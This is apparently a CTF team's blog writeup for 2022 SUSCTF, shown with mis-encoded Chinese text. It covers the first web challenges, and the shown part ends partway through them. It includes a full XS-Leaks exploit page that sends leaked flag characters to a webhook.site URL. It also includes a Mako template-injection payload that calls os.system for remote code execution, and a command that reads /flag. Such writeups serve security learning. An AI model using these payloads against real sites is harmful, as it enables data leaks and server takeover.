<!doctype html><html lang=en itemscope itemtype=http://schema.org/WebPage><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,maximum-scale=1"><title>2022 SUSCTF SU Writeup -</title><meta name=description content="æœ¬æ¬¡2022 SUSCTF æˆ‘ä»¬ SU å–å¾—äº† ç¬¬ä¸€å ğŸ†çš„å¥½æˆç»©ï¼Œæ„Ÿè°¢é˜Ÿé‡Œå¸ˆå‚…ä»¬çš„è¾›è‹¦ä»˜å‡ºï¼åŒæ—¶æˆ‘ä»¬ä¹Ÿåœ¨æŒç»­æ‹›äººï¼Œåªè¦ä½ æ‹¥æœ‰ä¸€é¢—çƒ­çˆ± CTF çš„å¿ƒï¼Œéƒ½å¯ä»¥åŠ å…¥æˆ‘ä»¬ï¼æ¬¢è¿å‘é€ä¸ªäººç®€ä»‹è‡³ï¼šsuers_xctf@126.comæˆ–ç›´æ¥è”ç³»ä¹¦é±¼(QQ:381382770)
ä»¥ä¸‹æ˜¯æˆ‘ä»¬ SU æœ¬æ¬¡ 2022 SUSCTFçš„ writeup"><meta name=author content="SUer"><script type=application/ld+json>{"@context":"http://schema.org","@type":"WebSite","name":"su-team","url":"https:\/\/su-team.cn\/"}</script><script type=application/ld+json>{"@context":"http://schema.org","@type":"Organization","name":"","url":"https:\/\/su-team.cn\/"}</script><script type=application/ld+json>{"@context":"http://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"item":{"@id":"https:\/\/su-team.cn\/","name":"home"}},{"@type":"ListItem","position":3,"item":{"@id":"https:\/\/su-team.cn\/post\/susctf-2022-su-wu\/","name":"2022 susctf su writeup"}}]}</script><script type=application/ld+json>{"@context":"http://schema.org","@type":"Article","author":{"name":"SUer"},"headline":"2022 SUSCTF SU Writeup","description":"æœ¬æ¬¡2022 SUSCTF æˆ‘ä»¬ SU å–å¾—äº† ç¬¬ä¸€å ğŸ†çš„å¥½æˆç»©ï¼Œæ„Ÿè°¢é˜Ÿé‡Œå¸ˆå‚…ä»¬çš„è¾›è‹¦ä»˜å‡ºï¼åŒæ—¶æˆ‘ä»¬ä¹Ÿåœ¨æŒç»­æ‹›äººï¼Œåªè¦ä½ æ‹¥æœ‰ä¸€é¢—çƒ­çˆ± CTF çš„å¿ƒï¼Œéƒ½å¯ä»¥åŠ å…¥æˆ‘ä»¬ï¼æ¬¢è¿å‘é€ä¸ªäººç®€ä»‹è‡³ï¼šsuers_xctf@126.comæˆ–ç›´æ¥è”ç³»ä¹¦é±¼(QQ:381382770) ä»¥ä¸‹æ˜¯æˆ‘ä»¬ SU æœ¬æ¬¡ 2022 SUSCTFçš„ writeup\n","inLanguage":"en","wordCount":8281,"datePublished":"2022-03-01T00:59:38\u002b00:00","dateModified":"2022-03-01T00:59:38\u002b00:00","image":"https:\/\/su-team.cn\/img\/SU.jpg","keywords":["SUSCTF"],"mainEntityOfPage":"https:\/\/su-team.cn\/post\/susctf-2022-su-wu\/","publisher":{"@type":"Organization","name":"https:\/\/su-team.cn\/","logo":{"@type":"ImageObject","url":"https:\/\/su-team.cn\/img\/SU.jpg","height":60,"width":60}}}</script><meta property="og:title" content="2022 SUSCTF SU Writeup"><meta property="og:description" content="æœ¬æ¬¡2022 SUSCTF æˆ‘ä»¬ SU å–å¾—äº† ç¬¬ä¸€å ğŸ†çš„å¥½æˆç»©ï¼Œæ„Ÿè°¢é˜Ÿé‡Œå¸ˆå‚…ä»¬çš„è¾›è‹¦ä»˜å‡ºï¼åŒæ—¶æˆ‘ä»¬ä¹Ÿåœ¨æŒç»­æ‹›äººï¼Œåªè¦ä½ æ‹¥æœ‰ä¸€é¢—çƒ­çˆ± CTF çš„å¿ƒï¼Œéƒ½å¯ä»¥åŠ å…¥æˆ‘ä»¬ï¼æ¬¢è¿å‘é€ä¸ªäººç®€ä»‹è‡³ï¼šsuers_xctf@126.comæˆ–ç›´æ¥è”ç³»ä¹¦é±¼(QQ:381382770)
ä»¥ä¸‹æ˜¯æˆ‘ä»¬ SU æœ¬æ¬¡ 2022 SUSCTFçš„ writeup"><meta property="og:image" content="https://su-team.cn/img/SU.jpg"><meta property="og:url" content="https://su-team.cn/post/susctf-2022-su-wu/"><meta property="og:type" content="website"><meta property="og:site_name" content="su-team"><meta name=twitter:title content="2022 SUSCTF SU Writeup"><meta name=twitter:description content="æœ¬æ¬¡2022 SUSCTF æˆ‘ä»¬ SU å–å¾—äº† ç¬¬ä¸€å ğŸ†çš„å¥½æˆç»©ï¼Œæ„Ÿè°¢é˜Ÿé‡Œå¸ˆå‚…ä»¬çš„è¾›è‹¦ä»˜å‡ºï¼åŒæ—¶æˆ‘ä»¬ä¹Ÿåœ¨æŒç»­æ‹›äººï¼Œåªè¦ä½ æ‹¥æœ‰ä¸€é¢—çƒ­çˆ± CTF çš„å¿ƒï¼Œéƒ½å¯ä»¥åŠ å…¥æˆ‘ä»¬ï¼æ¬¢è¿å‘é€ä¸ªäººç®€ä»‹è‡³ï¼šsuers_xctf@126.comæˆ–ç›´æ¥è”ç³»ä¹¦é±¼(QQ:381382770)
ä»¥ä¸‹æ˜¯æˆ‘ä»¬ SU æœ¬æ¬¡ 2022 SUSCTFçš„ writeup"><meta name=twitter:image content="https://su-team.cn/img/SU.jpg"><meta name=twitter:card content="summary_large_image"><link href=https://su-team.cn/img/SU.jpg rel=icon type=image/x-icon><meta name=generator content="Hugo 0.148.2"><link rel=alternate href=https://su-team.cn/index.xml type=application/rss+xml title=su-team><link rel=stylesheet href=https://su-team.cn/css/katex.min.css><link rel=stylesheet href=https://su-team.cn/fontawesome/css/brands.min.css><link rel=stylesheet href=https://su-team.cn/fontawesome/css/fontawesome.min.css><link rel=stylesheet href=https://su-team.cn/fontawesome/css/regular.min.css><link rel=stylesheet href=https://su-team.cn/fontawesome/css/solid.min.css><link rel=stylesheet href=https://su-team.cn/fontawesome/css/svg.min.css><link rel=stylesheet href=https://su-team.cn/fontawesome/css/svg-with-js.min.css><link rel=stylesheet href=https://su-team.cn/fontawesome/css/v4-font-face.min.css><link rel=stylesheet href=https://su-team.cn/fontawesome/css/v4-shims.min.css><link rel=stylesheet href=https://su-team.cn/fontawesome/css/v5-font-face.min.css><link rel=stylesheet href=https://su-team.cn/css/bootstrap.min.css><link rel=stylesheet href=https://su-team.cn/css/main.css><link rel=stylesheet href=https://su-team.cn/css/fonts.css><link rel=stylesheet href=https://su-team.cn/css/syntax.css><link rel=stylesheet href=https://su-team.cn/css/codeblock.css><link rel=stylesheet href=https://su-team.cn/css/photoswipe.min.css><link rel=stylesheet href=https://su-team.cn/css/photoswipe.default-skin.min.css><style>.navbar-custom .avatar-container{width:58px;height:58px;margin-top:-29px;left:50%;transform:translateX(-50%);display:flex;align-items:center;justify-content:center;background:#fff;border-radius:50%;box-shadow:0 6px 18px rgba(0,0,0,.12)}.navbar-custom .avatar-container .avatar-img-border{width:100%;height:100%;border-radius:50%;overflow:hidden;margin:0;box-shadow:none}.navbar-custom .avatar-container .avatar-img{width:100%;height:100%;object-fit:cover;border-radius:50%}@media only screen and (min-width:768px){.navbar-custom .avatar-container{width:72px;height:72px;margin-top:-36px}}</style></head><body><nav class="navbar navbar-default navbar-fixed-top navbar-custom"><div class=container-fluid><div class=navbar-header><button type=button class=navbar-toggle data-toggle=collapse data-target=#main-navbar>
<span class=sr-only>Toggle navigation</span>
<span class=icon-bar></span>
<span class=icon-bar></span>
<span class=icon-bar></span>
</button>
<a class="theme-toggle mobile-theme-toggle" href=javascript:void(0) onclick=toggleTheme() title="Toggle Theme"><span class=sr-only>Toggle Theme</span>
<svg class="theme-icon-moon" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg>
<svg class="theme-icon-sun" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg>
</a><a class=navbar-brand href=https://su-team.cn/>su-team</a></div><div class="collapse navbar-collapse" id=main-navbar><ul class="nav navbar-nav navbar-right"><li><a title=Archives href=/>Archives</a></li><li class=navlinks-container><a class=navlinks-parent role=button tabindex=0>Members</a><div class=navlinks-children><a href=/active-members>Members</a>
<a href=/pioneers>Pioneers</a></div></li><li><a title=About href=/page/about/>About</a></li><li><a title=Tags href=/tags>Tags</a></li><li class=hidden-xs><a href=javascript:void(0) class=theme-toggle onclick=toggleTheme() title="Toggle Theme"><span class=sr-only>Toggle Theme</span>
<svg class="theme-icon-moon" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg>
<svg class="theme-icon-sun" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></a></li></ul></div></div></nav><script>(function(){const e=localStorage.getItem("theme"),t=window.matchMedia("(prefers-color-scheme: dark)").matches;e==="dark"||!e&&t?document.body.classList.add("dark-mode"):document.body.classList.remove("dark-mode")})();function toggleTheme(){const e=document.body;e.classList.toggle("dark-mode"),e.classList.contains("dark-mode")?localStorage.setItem("theme","dark"):localStorage.setItem("theme","light")}</script><style>.theme-toggle{cursor:pointer;padding:15px;display:flex;align-items:center}.mobile-theme-toggle{float:right;padding:15px 10px;margin-top:2px}@media(min-width:768px){.mobile-theme-toggle{display:none !important}}.theme-icon-moon,.theme-icon-sun{color:#777;transition:color .3s,transform .3s}.theme-toggle:hover .theme-icon-moon,.theme-toggle:hover .theme-icon-sun{color:#333}.theme-icon-sun{display:none}.theme-icon-moon{display:block}body.dark-mode .theme-icon-sun{display:block;color:#000}body.dark-mode .theme-icon-moon{display:none}body.dark-mode{filter:none !important;background-color:#1a1a1a !important}body.dark-mode header,body.dark-mode .container,body.dark-mode footer{filter:invert(1)hue-rotate(180deg)}body.dark-mode .navbar-custom{background-color:#1a1a1a !important;border-bottom:1px solid #333}body.dark-mode .navbar-custom .container-fluid{filter:invert(1)hue-rotate(180deg)}body.dark-mode img,body.dark-mode video,body.dark-mode iframe,body.dark-mode .avatar-img,body.dark-mode .navbar-custom .avatar-container{filter:invert(1)hue-rotate(180deg)}</style><div class=pswp tabindex=-1 role=dialog aria-hidden=true><div class=pswp__bg></div><div class=pswp__scroll-wrap><div class=pswp__container><div class=pswp__item></div><div class=pswp__item></div><div class=pswp__item></div></div><div class="pswp__ui pswp__ui--hidden"><div class=pswp__top-bar><div class=pswp__counter></div><button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
<button class="pswp__button pswp__button--share" title=Share></button>
<button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
<button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button><div class=pswp__preloader><div class=pswp__preloader__icn><div class=pswp__preloader__cut><div class=pswp__preloader__donut></div></div></div></div></div><div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap"><div class=pswp__share-tooltip></div></div><button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
</button>
<button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)"></button><div class=pswp__caption><div class=pswp__caption__center></div></div></div></div></div><header class=header-section><div class="intro-header no-img"><div class=container><div class=row><div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1"><div class=post-heading><h1>2022 SUSCTF SU Writeup</h1><span class=post-meta><i class="fas fa-calendar"></i>&nbsp;Posted on March 1, 10338
&nbsp;|&nbsp;<i class="fas fa-clock"></i>&nbsp;39&nbsp;min
&nbsp;|&nbsp;<i class="fas fa-book"></i>&nbsp;8281&nbsp;words
&nbsp;|&nbsp;<i class="fas fa-user"></i>&nbsp;SUer</span></div></div></div></div></div></header><div class=container role=main><div class="row flex-row"><div class="col-lg-3 col-lg-offset-0 col-md-3 col-md-offset-0 hidden-sm hidden-xs"><div class=toc-sidebar><h4 class=toc-title>#<br>TABLE OF CONTENTS</h4><div class=toc-card><nav id=TableOfContents><ul><li><a href=#web>Web</a><ul><li><a href=#ez_note>ez_note</a></li><li><a href=#html-practice>HTML practice</a></li><li><a href=#fxxkcors>fxxkcors</a></li><li><a href=#rubbish-maker>rubbish maker</a><ul><li><a href=#statement>Statement</a></li><li><a href=#deobfuscation>Deobfuscation</a></li><li><a href=#manual-labor->Manual labor :)</a></li></ul></li><li><a href=#baby-gadget-v10>baby gadget v1.0</a></li><li><a href=#baby-gadget-v10s-rrrevenge>baby gadget v1.0&rsquo;s rrrevenge</a></li><li><a href=#baby-gadget-v20>baby gadget v2.0</a></li><li><a href=#baby-gadget-v20-revenge>baby gadget v2.0&rsquo; revenge</a></li></ul></li><li><a href=#misc>Misc</a><ul><li><a href=#checkin>Checkin</a></li><li><a href=#ra2>ra2</a></li><li><a href=#tanner>Tanner</a></li><li><a href=#audio>AUDIO</a></li><li><a href=#misound>misound</a><ul><li><a href=#éé¢„æœŸ>éé¢„æœŸ</a></li></ul></li></ul></li><li><a href=#pwn>Pwn</a><ul><li><a href=#rain>rain</a></li><li><a href=#happytree>happytree</a></li><li><a href=#kqueue>kqueue</a><ul><li><a href=#éé¢„æœŸ-1>éé¢„æœŸ</a></li></ul></li><li><a href=#kqueues-revenge>kqueue&rsquo;s revenge</a></li><li><a href=#mujs>mujs</a><ul><li><a href=#é¢˜ç›®æè¿°>é¢˜ç›®æè¿°</a></li><li><a href=#å¯»æ‰¾æ¼æ´ç‚¹>å¯»æ‰¾æ¼æ´ç‚¹</a></li><li><a href=#åˆ©ç”¨æ¼æ´>åˆ©ç”¨æ¼æ´</a><ul><li><a href=#ç±»å‹æ··æ·†>ç±»å‹æ··æ·†</a></li><li><a href=#è¶Šç•Œå†™dataviewçš„lengthå­—æ®µ>è¶Šç•Œå†™Dataviewçš„Lengthå­—æ®µ</a></li><li><a href=#ä½¿ç”¨å †ä¸Šçš„è¶Šç•Œè¯»å†™æ¥å®ç°ä»£ç æ‰§è¡Œ>ä½¿ç”¨å †ä¸Šçš„è¶Šç•Œè¯»å†™æ¥å®ç°ä»£ç æ‰§è¡Œ</a></li></ul></li><li><a href=#æœ€ç»ˆexp>æœ€ç»ˆexp</a></li></ul></li></ul></li><li><a href=#crypto>Crypto</a><ul><li><a href=#large-case>large case</a></li><li><a href=#inverseproblem>InverseProblem</a></li><li><a href=#specialcurve3>SpecialCurve3</a></li><li><a href=#ez_pager_tiper>Ez_Pager_Tiper</a></li></ul></li><li><a href=#rev>Rev</a><ul><li><a href=#digitalcircuits>DigitalCircuits</a></li><li><a href=#tttree>tttree</a></li><li><a href=#hell_world>hell_world</a><ul><li><a href=#exp>exp</a></li></ul></li></ul></li></ul></nav></div></div></div><div class="col-lg-9 col-md-9"><article role=main class=blog-post><p>æœ¬æ¬¡2022 SUSCTF æˆ‘ä»¬ SU å–å¾—äº† ç¬¬ä¸€å ğŸ†çš„å¥½æˆç»©ï¼Œæ„Ÿè°¢é˜Ÿé‡Œå¸ˆå‚…ä»¬çš„è¾›è‹¦ä»˜å‡ºï¼åŒæ—¶æˆ‘ä»¬ä¹Ÿåœ¨æŒç»­æ‹›äººï¼Œåªè¦ä½ æ‹¥æœ‰ä¸€é¢—çƒ­çˆ± CTF çš„å¿ƒï¼Œéƒ½å¯ä»¥åŠ å…¥æˆ‘ä»¬ï¼æ¬¢è¿å‘é€ä¸ªäººç®€ä»‹è‡³ï¼š<a href=mailto:suers_xctf@126.com>suers_xctf@126.com</a>æˆ–ç›´æ¥è”ç³»ä¹¦é±¼(QQ:381382770)
ä»¥ä¸‹æ˜¯æˆ‘ä»¬ SU æœ¬æ¬¡ 2022 SUSCTFçš„ writeup</p><h1 id=web>Web</h1><h2 id=ez_note>ez_note</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-CoffeeScript data-lang=CoffeeScript><span class=line><span class=cl><span class=nx>setTimeout</span><span class=p>(</span><span class=nf>() =&gt;</span> <span class=nv>location = </span><span class=s>&#39;{note_page}&#39;</span><span class=p>,</span> <span class=mi>1000</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><p>å…¸å‹çš„è·³è½¬ç±»å‹ XS-Leaks ï¼Œç›´æ¥ç¿»ä¸€ä¸‹ <a href=https://xsleaks.dev/docs/attacks/navigations/>wiki</a> å¯ä»¥åˆ©ç”¨ <code>history.length</code> ï¼Œé€šè¿‡è¿™ä¸ªæ¥æ£€æµ‹æ˜¯å¦å‘ç”Ÿäº†é‡å®šå‘</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-HTML data-lang=HTML><span class=line><span class=cl><span class=cp>&lt;!DOCTYPE html&gt;</span>
</span></span><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>html</span> <span class=na>lang</span><span class=o>=</span><span class=s>&#34;en&#34;</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>head</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>  <span class=p>&lt;</span><span class=nt>meta</span> <span class=na>charset</span><span class=o>=</span><span class=s>&#34;utf-8&#34;</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>  <span class=p>&lt;</span><span class=nt>meta</span> <span class=na>name</span><span class=o>=</span><span class=s>&#34;robots&#34;</span> <span class=na>content</span><span class=o>=</span><span class=s>&#34;noindex&#34;</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>  <span class=p>&lt;</span><span class=nt>meta</span> <span class=na>name</span><span class=o>=</span><span class=s>&#34;viewport&#34;</span> <span class=na>content</span><span class=o>=</span><span class=s>&#34;width=device-width, initial-scale=1.0&#34;</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>  <span class=p>&lt;</span><span class=nt>meta</span> <span class=na>http-equiv</span><span class=o>=</span><span class=s>&#34;X-UA-Compatible&#34;</span> <span class=na>content</span><span class=o>=</span><span class=s>&#34;ie=edge&#34;</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl><span class=p>&lt;/</span><span class=nt>head</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>body</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>    <span class=p>&lt;</span><span class=nt>script</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>      <span class=kd>var</span> <span class=nx>flag</span> <span class=o>=</span> <span class=s1>&#39;SUSCTF{&#39;</span>
</span></span><span class=line><span class=cl>      <span class=kd>function</span> <span class=nx>send</span><span class=p>(</span><span class=nx>msg</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nx>fetch</span><span class=p>(</span><span class=s1>&#39;https://webhook.site/bad84752-95a1-45c4-8395-e5577ea1112b?msg=&#39;</span> <span class=o>+</span> <span class=nb>encodeURIComponent</span><span class=p>(</span><span class=nx>msg</span><span class=p>))</span>
</span></span><span class=line><span class=cl>      <span class=p>}</span>
</span></span><span class=line><span class=cl>      <span class=kd>function</span> <span class=nx>trying</span><span class=p>(</span><span class=nx>keyword</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=k>new</span> <span class=nb>Promise</span><span class=p>(</span><span class=nx>resolve</span> <span class=p>=&gt;</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>          <span class=kd>var</span> <span class=nx>win</span> <span class=o>=</span> <span class=nb>window</span><span class=p>.</span><span class=nx>open</span><span class=p>(</span><span class=s1>&#39;http://123.60.29.171:10001/search?q=&#39;</span> <span class=o>+</span> <span class=nx>keyword</span><span class=p>)</span>
</span></span><span class=line><span class=cl>          <span class=nx>setTimeout</span><span class=p>(()</span> <span class=p>=&gt;</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=nx>win</span><span class=p>.</span><span class=nx>location</span> <span class=o>=</span> <span class=s1>&#39;http://e050-220-133-126-220.ngrok.io/non.html&#39;</span>
</span></span><span class=line><span class=cl>            <span class=nx>setTimeout</span><span class=p>(()</span> <span class=p>=&gt;</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>              <span class=k>if</span> <span class=p>(</span><span class=nx>win</span><span class=p>.</span><span class=nx>history</span><span class=p>.</span><span class=nx>length</span> <span class=o>===</span> <span class=mi>3</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=nx>send</span><span class=p>(</span><span class=s1>&#39;success:&#39;</span> <span class=o>+</span> <span class=nx>keyword</span><span class=p>)</span>
</span></span><span class=line><span class=cl>              <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=c1>//send(&#39;fail:&#39; + keyword)
</span></span></span><span class=line><span class=cl><span class=c1></span>              <span class=p>}</span>
</span></span><span class=line><span class=cl>              <span class=nx>win</span><span class=p>.</span><span class=nx>close</span><span class=p>();</span>
</span></span><span class=line><span class=cl>            <span class=p>},</span> <span class=mi>1000</span><span class=p>)</span>
</span></span><span class=line><span class=cl>          <span class=p>},</span> <span class=mi>1500</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=p>})</span>
</span></span><span class=line><span class=cl>      <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>      <span class=kr>async</span> <span class=kd>function</span> <span class=nx>run</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nx>send</span><span class=p>(</span><span class=s1>&#39;start&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=c1>// }abcdefghijklmnopqrstuvwxyz0123456789_
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=c1>// }abcdefghijklmnopqrs
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=c1>// 
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=kd>let</span> <span class=nx>chars</span> <span class=o>=</span> <span class=s1>&#39;_abcdefghijklmnopqrstuv&#39;</span><span class=p>.</span><span class=nx>split</span><span class=p>(</span><span class=s1>&#39;&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=c1>//let chars = &#39;}wxyz0123456789_&#39;.split(&#39;&#39;)
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=k>for</span><span class=p>(</span><span class=kd>let</span> <span class=kr>char</span> <span class=k>of</span> <span class=nx>chars</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>          <span class=kr>const</span> <span class=nx>temp</span> <span class=o>=</span> <span class=nx>flag</span> <span class=o>+</span> <span class=kr>char</span>
</span></span><span class=line><span class=cl>          <span class=nx>trying</span><span class=p>(</span><span class=nx>temp</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>      <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>      <span class=nx>setTimeout</span><span class=p>(()</span> <span class=p>=&gt;</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nx>run</span><span class=p>()</span>
</span></span><span class=line><span class=cl>      <span class=p>},</span> <span class=mi>1000</span><span class=p>)</span>
</span></span><span class=line><span class=cl>      
</span></span><span class=line><span class=cl>    <span class=p>&lt;/</span><span class=nt>script</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl><span class=p>&lt;/</span><span class=nt>body</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl><span class=p>&lt;/</span><span class=nt>html</span><span class=p>&gt;</span>
</span></span></code></pre></td></tr></table></div></div><p>æ‰‹åŠ¨å‘äº†å‡ æ¬¡ï¼Œå°±è¡Œäº†
ï¼ˆé¡ºä¾¿è¯´ä¸€ä¸‹ reCAPTCHA ä½“éªŒæ˜¯çœŸä¸å¥½ï¼Œä¸å¦‚æ¢ä¸€ä¸‹ gtest å•¥çš„éªŒè¯ç ã€‚</p><h2 id=html-practice>HTML practice</h2><p>æäº¤ % ä¼šå¯¼è‡´ç”Ÿæˆçš„é¡µé¢å´©æºƒï¼Œfuzz äº†ä¸€ä¸‡éï¼Œå‘ç° <code>##</code> å¯ä»¥è®©é¡µé¢ä¸ºç©ºï¼ŒçŒœæƒ³æ˜¯æŸç§è¯­è¨€æˆ–è€…æ¡†æ¶çš„æ³¨é‡Šç¬¦ã€‚
ä¸€æ®µæœç´¢ï¼Œå‘ç°æœ‰å¯èƒ½æ˜¯ mako æ¡†æ¶ï¼Œå°è¯•ä½¿ç”¨ mako æ¡†æ¶çš„å¾ªç¯ï¼š</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Erlang data-lang=Erlang><span class=line><span class=cl><span class=c>% for a in (1,2,3):
</span></span></span><span class=line><span class=cl><span class=c></span>    <span class=mi>1</span>
</span></span><span class=line><span class=cl><span class=c>% endfor
</span></span></span></code></pre></td></tr></table></div></div><p>å‘ç°é¡µé¢æˆåŠŸæ¸²æŸ“äº† 3 ä¸ª 1 ï¼Œæ„å‘³ç€ç¡®å®æ‰§è¡Œäº†æˆ‘ä»¬çš„å¾ªç¯è¯­å¥ï¼Œæ¥ç€ç¿»æ–‡æ¡£ï¼Œå‘ç°å¯ä»¥ç›´æ¥è°ƒç”¨ <code>os.system</code> ï¼Œå¹¶ä¸”é…åˆå‚æ•° <code>name</code> è¿›è¡Œ RCE</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-CSS data-lang=CSS><span class=line><span class=cl><span class=o>%</span> <span class=nt>for</span> <span class=nt>a</span> <span class=nt>in</span> <span class=o>(</span><span class=nt>self</span><span class=p>.</span><span class=nc>module</span><span class=p>.</span><span class=nc>cache</span><span class=p>.</span><span class=nc>util</span><span class=p>.</span><span class=nc>os</span><span class=p>.</span><span class=nc>system</span><span class=o>(</span><span class=nt>name</span><span class=o>),</span><span class=nt>2</span><span class=o>,</span><span class=nt>3</span><span class=o>):</span>
</span></span><span class=line><span class=cl>    <span class=nt>1</span>
</span></span><span class=line><span class=cl><span class=o>%</span> <span class=nt>endfor</span>
</span></span></code></pre></td></tr></table></div></div><p>ç»“åˆé¢˜ç›®æè¿°çš„ <code>./tamplate</code> ï¼Œç›´æ¥å°è¯•åˆ›å»ºä¸€ä¸ªæ–‡ä»¶å‘ç°å¯è¡Œï¼Œäºæ˜¯ç›´æ¥å°† flag å†…å®¹æ‰“å‡ºæ¥åˆ°ç›®å½•ä¸‹ï¼š</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Bash data-lang=Bash><span class=line><span class=cl>cat /flag &gt; ./template/xxxx.html
